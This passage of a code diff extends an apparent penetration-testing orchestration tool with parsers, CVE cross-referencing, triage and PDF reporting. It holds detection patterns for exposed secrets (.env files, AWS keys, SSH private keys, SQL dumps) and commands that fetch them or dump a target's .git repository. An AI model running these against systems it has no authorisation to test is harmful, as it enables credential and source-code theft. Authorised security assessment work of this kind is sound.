+            findings.append({"type": "js_endpoint", "severity": "info",
+                "path": s, "detail": f"API endpoint extracted from JS bundle: {s}",
+                "command": f"curl -sk {js_url}" if js_url else ""})
+    return findings
+
+# product-version regex -> CPE (vendor, product) mappings for NVD verification.
+# Only products with a known vendor/product CPE are cross-referenced; anything
+# else is reported nowhere rather than guessed.
+CPE_PATTERNS = [
+    (r'OpenSSH[_\s-]?([\d.]+)',           ('openbsd', 'openssh'), 'OpenSSH'),
+    (r'Apache httpd[ /\-]?([\d.]+)',      ('apache', 'http_server'), 'Apache'),
+    (r'nginx/([\d.]+)',                   ('nginx', 'nginx'), 'nginx'),
+    (r'MySQL[ /]([\d.]+)',                ('oracle', 'mysql'), 'MySQL'),
+    (r'MariaDB[ /]([\d.]+)',              ('mariadb', 'mariadb'), 'MariaDB'),
+    (r'PostgreSQL[ /]([\d.]+)',           ('postgresql', 'postgresql'), 'PostgreSQL'),
+    (r'redis[ -]?server[ =\w/]*([\d.]+)|redis_version[^\d]*([\d.]+)', ('redis', 'redis'), 'Redis'),
+    (r'MongoDB[ /]([\d.]+)',              ('mongodb', 'mongodb'), 'MongoDB'),
+    (r'Tomcat/([\d.]+)',                  ('apache', 'tomcat'), 'Tomcat'),
+    (r'vsftpd[ /]([\d.]+)',               ('vsftpd', 'vsftpd'), 'vsftpd'),
+    (r'ProFTPD[ /]([\d.]+)',              ('proftpd', 'proftpd'), 'ProFTPD'),
+    (r'PHP[ /]([\d.]+)',                  ('php', 'php'), 'PHP'),
+    (r'OpenSSL[ /]([\d.]+[a-z]?)',        ('openssl', 'openssl'), 'OpenSSL'),
+    (r'Samba[ /]([\d.]+)',                ('samba', 'samba'), 'Samba'),
+    (r'Jenkins[ :](\d+)',                 ('jenkins', 'jenkins'), 'Jenkins'),
+]
+
+def parse_version_cve(output, sess):
+    """Cross-references each nmap service/version pairing against the NVD
+    cpeName API. Findings are emitted only for CVEs NVD assigns to that exact
+    product+version CPE, carrying NVD's real CVSS vector; the finding severity
+    is derived from that score's band."""
+    findings = []
+    for line in output.splitlines():
+        if not re.search(r'\d+/tcp\s+open', line):
+            continue
+        port_m = re.search(r'(\d+)/tcp', line)
+        path = f":{port_m.group(1)}" if port_m else "service"
+        for pat, (vend, prod), tok in CPE_PATTERNS:
+            m = re.search(pat, line, re.I)
+            if not m:
+                continue
+            ver = next((g for g in m.groups() if g), None)
+            if not ver:
+                continue
+            ver = re.match(r'(\d+(?:\.\d+){1,3})', ver).group(1)
+            nvd = _nvd_verify_cpe(f"{vend}:{prod}", ver)
+            for c in nvd[:5]:
+                band = cvss31_band(c['score'])
+                sev = band if band in ('critical', 'high', 'medium') else 'low'
+                findings.append({"type": "cve", "severity": sev, "path": path,
+                    "detail": f"{tok} {ver} — {c['cve']} (CVSS {c['score']}, NVD-verified) — {c['reference'][:80]}",
+                    "command": f"nmap -sV -p {path.lstrip(':')} <target>",
+                    "cvss": {"vector": c['vector'], "base_score": c['score'],
+                             "severity_band": band, "band_mismatch": False,
+                             "source": "nvd-cpe-verified"}})
+            break
+    return findings
+
+def parse_tech(output, sess):
+    """whatweb plugin enumerations and nuclei [tech] hits are informational —
+    a technology fingerprint is not, by itself, a vulnerability."""
+    findings = []
+    seen = set()
+    for line in output.splitlines():
+        s = line.strip()
+        m = re.match(r'^(https?://\S+)\s+\[.*?\](.*)', s)
+        if m and 'whatweb' not in s.lower():
+            url = m.group(1)
+            for tok in re.findall(r'([A-Za-z0-9][A-Za-z0-9+_.-]*)\[([^\]\[]{0,30})\]', m.group(2)):
+                name, ver = tok
+                key = (name, ver)
+                if key in seen: continue
+                seen.add(key)
+                path = re.sub(r'https?://[^/]+', '', url) or '/'
+                detail = f"{name}" + (f" version {ver}" if ver and ver != '0' else "")
+                findings.append({"type": "tech_fingerprint", "severity": "info",
+                    "detail": f"{detail} at {url}", "path": path,
+                    "command": f"whatweb -a 3 {url}"})
+            continue
+        m = re.match(r'^\[([^\]]+)\]\s+(https?://\S+)', s)
+        if m and m.group(1).lower() not in ('info',):
+            tech, url = m.group(1), m.group(2)
+            if tech in seen: continue
+            seen.add(tech)
+            path = re.sub(r'https?://[^/]+', '', url) or '/'
+            findings.append({"type": "tech_fingerprint", "severity": "info",
+                "detail": f"{tech} detected at {url}", "path": path,
+                "command": f"nuclei -u {url} -t http/technologies"})
+        if len(findings) >= 15:
+            break
+    return findings
+
+PROVIDER_PATTERNS = [
+    (r'cf-ray|^server:.*cloudflare', 'Cloudflare (CDN/WAF)'),
+    (r'x-amz-|x-amz-cf-|x-amz-apigw', 'Amazon Web Services (S3/CloudFront/API Gateway)'),
+    (r'x-azure-|azurewebsites', 'Microsoft Azure'),
+    (r'x-gcs-|x-goog-|google.*storage', 'Google Cloud Platform'),
+    (r'x-sucuri', 'Sucuri (CDN/WAF)'),
+]
+
+def parse_cloud(output, sess):
+    """CDN/cloud provider fingerprinting and well-known endpoint baseline. All
+    informational: a provider header or a reachable path is not a vuln."""
+    findings = []
+    prov = set()
+    for line in output.splitlines():
+        for pat, label in PROVIDER_PATTERNS:
+            if re.search(pat, line, re.I):
+                m = re.match(r'^([A-Za-z0-9-]+):\s*(.*)', line.strip())
+                header = f" ({m.group(1)}: {m.group(2)[:40]})" if m else ''
+                key = label
+                if key not in prov:
+                    prov.add(key)
+                    findings.append({"type": "cloud_provider", "severity": "info",
+                        "detail": f"Cloud/CDN provider detected: {label}{header}",
+                        "path": "/", "command": "curl -skI http://<target>"})
+                break
+        w = re.match(r'^(\.well-known/[^ ]+|\S+\.txt)\s+->\s*(\d{3})', line.strip())
+        if w and w.group(2) == '200':
+            findings.append({"type": "cloud_endpoint", "severity": "info",
+                "detail": f"Baseline probe {w.group(1)} returned HTTP 200",
+                "path": f"/{w.group(1)}", "command": f"curl -sk -o /dev/null -w '%{{http_code}}' http://<target>/{w.group(1)}"})
+    return findings
+
+def parse_ad_enum(output, sess):
+    """Anonymous LDAP bind / naming-context exposure is a recon baseline —
+    reported as informational context, never as an assumed takeover."""
+    findings = []
+    text = output
+    if re.search(r'[Nn]amingContexts[:\s]*(DC=|dn:)', text):
+        findings.append({"type": "ad_enum", "severity": "info",
+            "detail": "LDAP anonymous base query returned naming contexts — directory data visible unauthenticated",
+            "path": "ldap://<target>", "command": "ldapsearch -x -H ldap://<target> -s base namingContexts"})
+    if re.search(r'result:\s*0\s+Success', text, re.I) and re.search(r'DC=', text, re.I):
+        findings.append({"type": "ad_enum", "severity": "info",
+            "detail": "Active Directory naming context responded to anonymous LDAP probe",
+            "path": "ldap://<target>", "command": "ldapsearch -x -H ldap://<target> -s base dn"})
+    return findings
+
+def parse_evidence(output, sess):
+    return []
+
+def parse_assess(output, sess):
+    return []
+
 def parse_xss_probe(output):
     findings = []
     for line in output.splitlines():
@@ -1481,18 +2391,21 @@ def parse_xss_probe(output):
 
 def parse_cms_scan(output):
     findings = []
-    # WordPress detection
-    if re.search(r'wp-login.*200|WordPress', output, re.I):
-        findings.append({"type":"cms_wordpress","severity":"medium",
-            "detail":"WordPress installation detected",
-            "path":"/wp-login.php",
-            "command":"wpscan --url http://<target> --enumerate vp,u,m"})
+    # WordPress: the login page must actually render WP fingerprints — a bare
+    # 200 on /wp-login.php is not proof a CMS is installed.
+    wpm = re.search(r'wp-login:(\d{3})\|(.*)', output)
+    if wpm and wpm.group(1) not in REDIRECT_CODES and \
+       re.search(r'name="log"|wp-submit|wordpress|wp-content', wpm.group(2), re.I):
+        findings.append({"type": "cms_wordpress", "severity": "medium",
+            "detail": "WordPress installation detected",
+            "path": "/wp-login.php",
+            "command": "wpscan --url http://<target> --enumerate vp,u,m"})
     # WordPress user enumeration
     if re.search(r'"id":\s*\d+.*"name":|wp/v2/users.*200', output, re.I):
-        findings.append({"type":"wp_user_enum","severity":"high",
-            "detail":"WordPress REST API exposes user enumeration at /wp-json/wp/v2/users",
-            "path":"/wp-json/wp/v2/users",
-            "command":"curl -sk http://<target>/wp-json/wp/v2/users"})
+        findings.append({"type": "wp_user_enum", "severity": "high",
+            "detail": "WordPress REST API exposes user enumeration at /wp-json/wp/v2/users",
+            "path": "/wp-json/wp/v2/users",
+            "command": "curl -sk http://<target>/wp-json/wp/v2/users"})
     # WPScan findings
     for line in output.splitlines():
         if re.search(r'\[!\]|\[i\].*found|vulnerability|outdated|CVE-', line, re.I):
@@ -1501,18 +2414,24 @@ def parse_cms_scan(output):
             findings.append({"type":"cms_vulnerability","severity":sev,
                 "detail":line.strip()[:200],"path":"WordPress",
                 "command":"wpscan --url http://<target> --enumerate vp,u --plugins-detection aggressive"})
-    # Drupal detection
-    if re.search(r'CHANGELOG\.txt.*Drupal|drupal_login.*200|Drupal', output, re.I):
-        findings.append({"type":"cms_drupal","severity":"medium",
-            "detail":"Drupal CMS detected — check for Drupalgeddon (SA-CORE-2018-002)",
-            "path":"/CHANGELOG.txt or /user/login",
-            "command":"droopescan scan drupal -u http://<target>"})
-    # Joomla detection
-    if re.search(r'joomla_admin.*200|Joomla', output, re.I):
-        findings.append({"type":"cms_joomla","severity":"medium",
-            "detail":"Joomla CMS admin panel detected",
-            "path":"/administrator/",
-            "command":"joomscan --url http://<target>"})
+    # Drupal: CHANGELOG version line or the login form fingerprint (body, not
+    # status) — a 200 on a redirect-to-HTTPS catch-all is no detection.
+    drupal_evidence = re.search(r'Drupal\s+\d+\.\d+|SA-CORE-\d{4}-\d{4}', output, re.I)
+    dm = re.search(r'drupal_login:(\d{3})\|(.*)', output)
+    if drupal_evidence or (dm and dm.group(1) not in REDIRECT_CODES and
+            re.search(r'user-login-form|form_id.*user_login|drupal', dm.group(2), re.I)):
+        findings.append({"type": "cms_drupal", "severity": "medium",
+            "detail": "Drupal CMS detected — check for Drupalgeddon (SA-CORE-2018-002)",
+            "path": "/CHANGELOG.txt or /user/login",
+            "command": "droopescan scan drupal -u http://<target>"})
+    # Joomla: admin panel requires its form/module fingerprint in the body.
+    jm = re.search(r'joomla_admin:(\d{3})\|(.*)', output)
+    if jm and jm.group(1) not in REDIRECT_CODES and \
+       re.search(r'mod-login|com_login|joomla|user\s*name.*password', jm.group(2), re.I):
+        findings.append({"type": "cms_joomla", "severity": "medium",
+            "detail": "Joomla CMS admin panel detected",
+            "path": "/administrator/",
+            "command": "joomscan --url http://<target>"})
     return findings
 
 def parse_cred_harvest(output):
@@ -1534,29 +2453,46 @@ def parse_cred_harvest(output):
         '.git/COMMIT_EDITMSG': ('git_exposed', 'high', 'Git repository exposed — source code at risk'),
         '.git/config': ('git_config', 'high', 'Git config exposed — may contain remote credentials'),
     }
-    secret_keys_sorted = sorted(secret_paths.items(), key=lambda kv: len(kv[0]), reverse=True)
+    # Content evidence per sensitive file: an HTTP 200 alone proves nothing
+    # (catch-all routers return 200 for any path). The probe returns the body
+    # (following redirects), so only the actual artifact — real .env syntax, a
+    # PEM private key, an ini-section git config — becomes a finding.
+    evidence_map = {
+        '.env': r'[A-Za-z_][A-Za-z0-9_]{2,}\s*=\s*\S{3,}',
+        '.env.local': r'[A-Za-z_][A-Za-z0-9_]{2,}\s*=\s*\S{3,}',
+        '.env.backup': r'[A-Za-z_][A-Za-z0-9_]{2,}\s*=\s*\S{3,}',
+        'wp-config.php': r'define\s*\(|DB_NAME|DB_PASSWORD|DB_HOST|table_prefix',
+        'config.php': r'["\'](?:db|DB_|host|user|password|secret|app_key|key)["\']\s*=>',
+        'config/database.yml': r'(?:username|password|database|adapter)\s*:\s*\S',
+        'application.properties': r'(?:spring|jdbc|password|secret|api[_-]?key|access[_-]?key)\s*[=:]',
+        'secrets.yaml': r'(?:secret|api[_-]?key|token|password)\s*:\s*\S',
+        '.aws/credentials': r'aws_access_key_id|aws_secret_access_key|\[(?:default|profile)\b',
+        'id_rsa': r'PRIVATE KEY-----',
+        '.ssh/id_rsa': r'PRIVATE KEY-----',
+        'backup.sql': r'CREATE TABLE|INSERT INTO|DROP TABLE|CREATE DATABASE',
+        'database.sql': r'CREATE TABLE|INSERT INTO|DROP TABLE|CREATE DATABASE',
+        '.git/config': r'\[(?:core|remote|branch|user)\]|repositoryformatversion',
+    }
+    secret_keys_sorted = sorted(secret_paths, key=len, reverse=True)
     for line in output.splitlines():
-        m = re.search(r'([^:\s]+):\s*(\d{3})\s*$', line)
-        if m:
-            path_key = m.group(1).lstrip('/')
-            code = m.group(2)
-            matched = False
-            for key, (ftype, sev, msg) in secret_keys_sorted:
-                if key in path_key:
-                    matched = True
-                    findings.append({"type":ftype,"severity":sev,
-                        "detail":f"{msg} (HTTP {code})",
-                        "path":f"/{path_key}",
-                        "command":f"curl -sk http://<target>/{path_key}"})
+        m = re.search(r'([^:|]+):(\d{3})\|(.*)', line)
+        if not m:
+            continue
+        path_key, code, body = m.group(1).strip(), m.group(2), m.group(3)
+        if code in REDIRECT_CODES or code not in ('200', '201', '204'):
+            continue
+        for key in secret_keys_sorted:
+            if key in path_key:
+                rex = evidence_map.get(key)
+                if rex and not re.search(rex, body, re.I):
                     break
-            if code in ('200','301') and not matched:
-                # generic sensitive path
-                if any(x in path_key for x in ['backup','config','secret','key','credential','token','passwd']):
-                    findings.append({"type":"sensitive_path","severity":"high",
-                        "detail":f"Sensitive path accessible: /{path_key} (HTTP {code})",
-                        "path":f"/{path_key}",
-                        "command":f"curl -sk http://<target>/{path_key}"})
-    # Git content exposure
+                ftype, sev, msg = secret_paths[key]
+                findings.append({"type": ftype, "severity": sev,
+                    "detail": f"{msg} (HTTP {code})",
+                    "path": f"/{path_key}",
+                    "command": f"curl -skL http://<target>/{path_key}"})
+                break
+    # Git content exposure (evidence-based: real ini sections / remote URLs)
     if re.search(r'remote.*url.*github|remote.*url.*gitlab|remote.*url.*bitbucket', output, re.I):
         findings.append({"type":"git_remote_exposed","severity":"high",
             "detail":"Git remote URL leaked in .git/config — repository URL and potential credentials disclosed",
@@ -1568,6 +2504,35 @@ def parse_cred_harvest(output):
             "path":"/.git/config",
             "command":"git clone http://<target>/.git /tmp/dumped_repo"})
     return findings
+
+def _normalize_findings(findings, sess, sub_id):
+    """Real-target normalization: findings must reference the user's actual
+    target and the command that actually ran — never <target> placeholders,
+    other unresolved placeholders, or empty/junk commands.
+    Also drops any negated-result finding ("not vulnerable" style) so it can
+    never reach /status, SSE, the PDF or the findings popups."""
+    findings[:] = [f for f in findings
+                   if not any(isinstance(f.get(k), str) and _NEGATED_RESULT.search(f[k])
+                              for k in ('detail', 'line', 'title', 'cve'))]
+    real_target = sess.get('target', '')
+    real_cmd = sess['commands'].get(sub_id, '')
+    for f in findings:
+        for key in ('command', 'detail', 'path'):
+            val = f.get(key)
+            if isinstance(val, str) and '<target>' in val:
+                f[key] = val.replace('<target>', real_target)
+        cmd = str(f.get('command') or '').strip()
+        if not cmd or cmd.lower() in ('manual review', 'msfconsole -q') \
+                or re.search(r'<[^<>\n]{1,60}>', cmd):
+            f['command'] = real_cmd
+        pth = f.get('path')
+        if isinstance(pth, str) and re.search(r'<[^<>\n]{1,60}>', pth):
+            f['path'] = '-'
+        score_finding(f)        # CVSS v3.1 vector + base score (choke point)
+        _triage_finding(f)      # automated false-positive verdict (choke point)
+    _append_triage_log(sess, sub_id, findings)
+    return findings
+
 
 def dispatch_parser(parse_type, output, sess):
     parsers = {
@@ -1586,6 +2551,15 @@ def dispatch_parser(parse_type, output, sess):
         "xss_probe": parse_xss_probe,
         "cms_scan": parse_cms_scan,
         "cred_harvest": parse_cred_harvest,
+        "subdomains": parse_subdomains,
+        "breach_osint": parse_breach_osint,
+        "js_leak": parse_js_leak,
+        "version_cve": parse_version_cve,
+        "tech": parse_tech,
+        "cloud": parse_cloud,
+        "ad_enum": parse_ad_enum,
+        "evidence": parse_evidence,
+        "assess": parse_assess,
         # API
         "api_discovery": parse_api_discovery,
         "api_bola": parse_api_bola,
@@ -1604,7 +2578,12 @@ def dispatch_parser(parse_type, output, sess):
     }
     if parse_type == "version_gap":
         return parse_version_gap(output, sess)
-    return parsers.get(parse_type, parse_generic)(output)
+    fn = parsers.get(parse_type, parse_generic)
+    try:
+        arity = len(inspect.signature(fn).parameters)
+    except (TypeError, ValueError):
+        arity = 1
+    return fn(output, sess) if arity >= 2 else fn(output)
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -1621,6 +2600,18 @@ LONG_SUBSTAGE_TIMEOUT = {
     "ep_hydra": 1800,
     "ep_msf_check": 1200,
     "ep_sqli_verify": 2400,
+    "recon_subdomains": 900,
+    "recon_osint_passive": 300,
+    "recon_breach_osint": 900,
+    "recon_js_leak": 480,
+    "recon_version_cve": 900,
+    "recon_tech": 900,
+    "recon_nuclei": 1800,
+    "recon_content": 1200,
+    "recon_ad_enum": 300,
+    "recon_cloud": 300,
+    "vuln_evidence": 900,
+    "vuln_assess": 60,
 }
 
 def execute_substage(sid, sub_id):
@@ -1640,6 +2631,118 @@ def execute_substage(sid, sub_id):
         _advance_chain(sid, sub_id)
 
 
+def _run_assessment(sid, sub_id, sub):
+    """vuln_assess — in-process CVSS scoring + false-positive triage summary.
+    Reads the session's accumulated findings, recomputes CVSS scores and triage
+    verdicts (already attached at the choke point), and writes an assessment log
+    the analyst can audit. Emits no vulnerability findings itself."""
+    sess = sessions.get(sid)
+    lines = []
+    all_f = []
+    for sub_f in list(sess.get('findings', {}).values()):
+        all_f.extend(sub_f)
+    sev_order = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3, 'info': 4}
+    all_f.sort(key=lambda f: (sev_order.get(f.get('severity'), 9), str(f.get('type'))))
+    lines.append(f"CVSS SCORING & FALSE-POSITIVE TRIAGE — {len(all_f)} finding(s) across all substages")
+    lines.append(f"{'':=^92}")
+    confirmed = toolconf = review = info = 0
+    for f in all_f:
+        sev = f.get('severity', 'info')
+        typ = f.get('type', '')
+        v = f.get('triage', {}).get('verdict', 'needs_review')
+        cv = f.get('cvss', {})
+        if v == 'confirmed': confirmed += 1
+        elif v == 'tool-confirmed': toolconf += 1
+        elif v == 'info': info += 1
+        else: review += 1
+        band = cv.get('severity_band', '')
+        mismatch = '  <-- BAND MISMATCH (review)' if cv.get('band_mismatch') else ''
+        lines.append(f"[{sev.upper():<8}] {typ:<26} cvss={cv.get('base_score','-')} ({band})"
+                     f" verdict={v}{mismatch} | {f.get('detail','')[:90]}")
+        if cv.get('vector'):
+            lines.append(f"{'':>13}vector: {cv['vector']}")
+        if f.get('evidence'):
+            ev = f['evidence']
+            sht = ', '.join(os.path.basename(x) for x in ev.get('screenshots', []))
+            pcap = os.path.basename(ev['pcap']) if ev.get('pcap') else '-'
+            lines.append(f"{'':>13}evidence: screenshot=[{sht}] pcap=[{pcap}]")
+    lines.append("")
+    lines.append(f"SUMMARY — confirmed={confirmed} tool-confirmed={toolconf} "
+                 f"needs_review={review} informational={info}")
+    lines.append(f"Band-mismatch rows above mean the computed CVSS severity disagrees with the label; "
+                 f"resolve manually before relying on them.")
+    recap = "\n".join(lines)
+    outdir = sess.get('outdir', '/tmp')
+    try:
+        a_file = os.path.join(outdir, 'assessment.txt')
+        with open(a_file, 'w') as fh:
+            fh.write(recap + "\n")
+    except OSError as ex:
+        recap += f"\n[warn] could not write assessment file: {ex}"
+    sess['assessment'] = recap
+    for ln in recap.splitlines():
+        push(sid, "output", {"substage": sub_id, "line": ln, "type": "info"})
+    sess['completed'].append(sub_id)
+    push(sid, "completed", {"substage": sub_id, "findings": [], "finding_count": 0, "rc": 0})
+    _advance_chain(sid, sub_id)
+
+
+def _run_evidence_capture(sid, sub_id, sub):
+    """vuln_evidence — capture screenshot + PCAP for each scorable finding that
+    has a reachable http endpoint. Evidence is attached to the finding and an
+    `evidence_capture` info finding is emitted per capture. Nothing is
+    fabricated: a failed capture produces an error string, not a fake file."""
+    sess = sessions.get(sid)
+    outdir = sess.get('outdir', '/tmp')
+    evdir = os.path.join(outdir, 'evidence')
+    os.makedirs(evdir, exist_ok=True, mode=0o700)
+    captured = []
+    all_f = []
+    for sub_f in list(sess.get('findings', {}).values()):
+        all_f.extend(sub_f)
+    cands = [f for f in all_f
+             if f.get('severity') in ('critical', 'high', 'medium')
+             and f.get('cvss', {}).get('vector') is not None]
+    push(sid, "output", {"substage": sub_id,
+         "line": f"[evidence capture] {len(cands)} scorable finding(s) eligible (critical/high/medium)", "type": "meta"})
+    for f in cands[:8]:
+        url = _finding_url(f, sess)
+        if not url:
+            push(sid, "output", {"substage": sub_id,
+                 "line": f"[evidence] no http endpoint for {f.get('type')} — skipped", "type": "meta"})
+            continue
+        push(sid, "output", {"substage": sub_id, "line": f"[evidence] capturing {f.get('type')} → {url}", "type": "meta"})
+        rec = _capture_evidence(f, sess)
+        f['evidence'] = rec
+        sht = len(rec.get('screenshots', []))
+        pcap = rec.get('pcap')
+        detail = (f"Evidence for '{f.get('type')}' at {url}: {sht} screenshot(s) "
+                  + (f", pcap {os.path.basename(pcap)}" if pcap else ", pcap=error"))
+        captured.append({"type": "evidence_capture", "severity": "info",
+                         "detail": detail, "path": f.get('path') or url,
+                         "command": f"capture evidence for {url}",
+                         "evidence": {"screenshots": rec.get('screenshots', []),
+                                      "pcap": rec.get('pcap'),
+                                      "errors": rec.get('errors', [])}})
+        if pcap:
+            push(sid, "output", {"substage": sub_id,
+                 "line": f"[evidence] {os.path.basename(pcap)} — {os.path.getsize(pcap)} bytes",
+                 "type": "info"})
+        for e in rec.get('errors', []):
+            push(sid, "output", {"substage": sub_id, "line": f"[evidence] {e}", "type": "meta"})
+    _normalize_findings(captured, sess, sub_id)
+    if not captured:
+        captured.append({"type": "evidence_capture", "severity": "info",
+                         "detail": "No screenshot/pcap capture run — no scorable finding had a reachable http endpoint",
+                         "path": "-", "command": "-"})
+        _normalize_findings(captured, sess, sub_id)
+    sess['findings'][sub_id] = captured
+    sess['completed'].append(sub_id)
+    push(sid, "completed", {"substage": sub_id, "findings": captured,
+         "finding_count": len(captured), "rc": 0})
+    _advance_chain(sid, sub_id)
+
+
 def _execute_substage(sid, sub_id):
     sess = sessions.get(sid)
     sub = find_sub(sub_id)
@@ -1647,6 +2750,13 @@ def _execute_substage(sid, sub_id):
         return
 
     push(sid, "running", {"substage": sub_id, "label": sub['label']})
+
+    if sub_id == 'vuln_assess':
+        _run_assessment(sid, sub_id, sub)
+        return
+    if sub_id == 'vuln_evidence':
+        _run_evidence_capture(sid, sub_id, sub)
+        return
 
     if PWM_CMD_TIMEOUT > 0:
         sub_timeout = sub.get('timeout') or LONG_SUBSTAGE_TIMEOUT.get(sub_id)
@@ -1661,11 +2771,21 @@ def _execute_substage(sid, sub_id):
 
     cmd_template = sub.get('cmd_template', 'echo "no command"')
     cmd = make_cmd(cmd_template, sess)
-    _raw_bin = cmd.strip().split()[0]
-    if _raw_bin == 'sudo' and len(cmd.strip().split()) > 1:
-        _raw_bin = cmd.strip().split()[1]
+    _parts = cmd.strip().split()
+    _raw_bin = _parts[0] if _parts else ''
+    if _raw_bin == 'sudo' and len(_parts) > 1:
+        _raw_bin = _parts[1]
+    if _raw_bin == 'timeout':
+        # resolve the real tool behind 'timeout -k 5 N <tool> ...' so
+        # missing-tool fallback still keys off the actual binary
+        for _tok in _parts[1:]:
+            if _tok.startswith('-') or re.fullmatch(r'[\d.]+', _tok):
+                continue
+            _raw_bin = _tok
+            break
     skip_check = _raw_bin in ('echo','for','bash','sh','curl','nc','python3','dig',
-                               'host','whois','redis-cli','mysql','psql','mysqladmin','mongo')
+                               'host','whois','redis-cli','mysql','psql','mysqladmin','mongo',
+                               'if','case','while','until','mkdir','cd','export','set','[')
     tool_bin = None if skip_check else _raw_bin
     if 'nmap' in cmd[:30]: tool_bin = 'nmap'
 
@@ -1705,12 +2825,13 @@ def _execute_substage(sid, sub_id):
     if parse_output.startswith('$ '):
         parse_output = '\n'.join(parse_output.splitlines()[1:])
     findings = dispatch_parser(sub.get('parse', 'generic'), parse_output, sess)
-    # Signature scan on output (command echo stripped)
-    for sig, msg, sev in ANOMALY_SIGNATURES:
-        if re.search(sig, parse_output, re.I) and not any(f.get('detail') == msg for f in findings):
+    # Signature scan on output (command echo stripped, negated results excluded)
+    for msg, sev in sig_matches(parse_output):
+        if not any(f.get('detail') == msg for f in findings):
             findings.append({"type":"signature_match","detail":msg,"severity":sev,
                 "path":"detected in output","command":"manual review"})
 
+    _normalize_findings(findings, sess, sub_id)
     sess['findings'][sub_id] = findings
 
     if sub_id == 'recon_ports':
@@ -1794,6 +2915,7 @@ def new_session():
         "lock": threading.Lock(),
         "ports_found": "", "banner_search": target,
         "network": infer_network(target), "notes": {},
+        "triage_log": {}, "assessment": None,
     }
     output_queues[sid] = queue.Queue(maxsize=20000)
     return jsonify({"sid": sid, "target": target, "target_type": sessions[sid]['target_type']})
@@ -1810,6 +2932,48 @@ def delete_session(sid):
         sessions.pop(sid, None)
     shutil.rmtree(sess['outdir'], ignore_errors=True)
     return jsonify({"ok": True})
+
+@app.route('/api/session/<sid>/triage', methods=['POST'])
+def manual_triage(sid):
+    """Analyst override of an automated triage verdict. Verdicts: confirmed,
+    tool-confirmed, needs_review, info (dismiss). Records the override in the
+    session triage log with provenance=analyst."""
+    sess = sessions.get(sid)
+    if not sess: return jsonify({"error":"unknown session"}), 404
+    data = request.json or {}
+    sub_id = data.get('substage_id')
+    index = data.get('index')
+    verdict = data.get('verdict')
+    note = data.get('note', '')
+    if not sub_id or sub_id not in sess['findings']:
+        return jsonify({"error":"unknown substage"}), 400
+    try:
+        index = int(index)
+    except (TypeError, ValueError):
+        return jsonify({"error":"invalid index"}), 400
+    if verdict not in ('confirmed', 'tool-confirmed', 'needs_review', 'info'):
+        return jsonify({"error":"invalid verdict"}), 400
+    fs = sess['findings'].get(sub_id, [])
+    if index < 0 or index >= len(fs):
+        return jsonify({"error":"index out of range"}), 400
+    f = fs[index]
+    f['triage'] = {"verdict": verdict, "basis": f.get('triage', {}).get('basis', ''),
+                   "provenance": "analyst", "note": note,
+                   "ts": datetime.now().isoformat()}
+    log = sess.get('triage_log', {})
+    recs = log.get(sub_id, [])
+    if recs and any(r.get('index') == index for r in recs):
+        for r in recs:
+            if r.get('index') == index:
+                r.update({"verdict": verdict, "note": note, "provenance": "analyst",
+                          "ts": f['triage']['ts']})
+    else:
+        recs.append({"index": index, "type": f.get('type'), "severity": f.get('severity'),
+                     "verdict": verdict, "basis": f['triage']['basis'], "provenance": "analyst",
+                     "note": note, "ts": f['triage']['ts']})
+    log[sub_id] = recs
+    sess['triage_log'] = log
+    return jsonify({"ok": True, "verdict": verdict})
 
 @app.route('/api/session/<sid>/approve', methods=['POST'])
 def approve(sid):
@@ -1898,6 +3062,8 @@ def status(sid):
         "finding_counts": {k:len(v) for k,v in sess['findings'].items()},
         "findings": sess['findings'],
         "ports_found": sess.get('ports_found',''),
+        "triage_log": sess.get('triage_log', {}),
+        "assessment": sess.get('assessment'),
     })
 
 @app.route('/api/session/<sid>/report')
@@ -2283,13 +3449,32 @@ def build_pdf(sess: dict) -> str:
                 ]))
 
                 # detail rows
+                cvss = f.get('cvss', {}) or {}
+                triage = f.get('triage', {}) or {}
+                cvss_line = (f"CVSS {cvss.get('base_score','—')} ({cvss.get('severity_band','—')})"
+                             + ("  ⚠ BAND MISMATCH" if cvss.get('band_mismatch') else ""))
+                vector_line = cvss.get('vector') or '—'
+                triage_line = triage.get('verdict', '—')
+                if triage.get('provenance') == 'analyst':
+                    triage_line += "  (operator overridden)"
                 detail_rows = [
                     ["Type",         ftype.replace('_',' ').title()],
                     ["Path/Location",fpath],
+                    ["CVSS v3.1",    cvss_line],
+                    ["CVSS Vector",  vector_line],
+                    ["Triage",       triage_line],
                     ["Detection Cmd",cmd],
                     ["How Exploited", exploit],
                     ["Remediation",  rem_text],
                 ]
+                evidence = f.get('evidence', {}) or {}
+                ev_paths = []
+                if isinstance(evidence, dict):
+                    ev_paths = [os.path.basename(x) for x in evidence.get('screenshots', [])]
+                    if evidence.get('pcap'):
+                        ev_paths.append(os.path.basename(evidence['pcap']))
+                if ev_paths:
+                    detail_rows.append(["Evidence", ", ".join(ev_paths)])
                 det_t = Table(detail_rows, colWidths=[3*cm, W-3*cm])
                 det_t.setStyle(TableStyle([
                     ('FONTNAME',(0,0),(0,-1),'Helvetica-Bold'),
@@ -2380,9 +3565,51 @@ def build_pdf(sess: dict) -> str:
             ]))
         story.append(PageBreak())
 
+    # ── CVSS SCORING & FALSE-POSITIVE TRIAGE ───────────────────────────────
+    all_scored = [f for f in all_f if f.get('cvss', {}).get('base_score')]
+    if all_scored or sess.get('assessment'):
+        story += [
+            Paragraph("6. CVSS Scoring & False-Positive Triage", H2),
+            HRFlowable(width="100%", thickness=0.5, color=colors.HexColor('#e1e4e8')),
+            Spacer(1,0.15*cm),
+        ]
+        if sess.get('assessment'):
+            for ln in sess['assessment'].splitlines()[:60]:
+                story.append(Paragraph(html.escape(ln), META)
+                             if ('—' in ln or '|' in ln or 'cvss=' in ln)
+                             else Preformatted(ln, CODE))
+            story.append(Spacer(1,0.2*cm))
+        t_rows = [["Type","Severity","CVSS","Band","Triage","Path"]]
+        for f in all_scored[:60]:
+            cvss = f.get('cvss', {})
+            tgt = f.get('triage', {})
+            t_rows.append([
+                f.get('type','').replace('_',' ')[:22],
+                f.get('severity','info').upper(),
+                str(cvss.get('base_score','—')),
+                cvss.get('severity_band','—') or '—',
+                tgt.get('verdict','—'),
+                (f.get('path') or '—')[:30],
+            ])
+        t_t = Table(t_rows, colWidths=[3.2*cm,1.8*cm,1.4*cm,1.8*cm,2.6*cm,5.7*cm])
+        t_t.setStyle(TableStyle([
+            ('FONTNAME',(0,0),(-1,0),'Helvetica-Bold'),
+            ('FONTSIZE',(0,0),(-1,-1),7.5),
+            ('BACKGROUND',(0,0),(-1,0),colors.HexColor('#2d3748')),
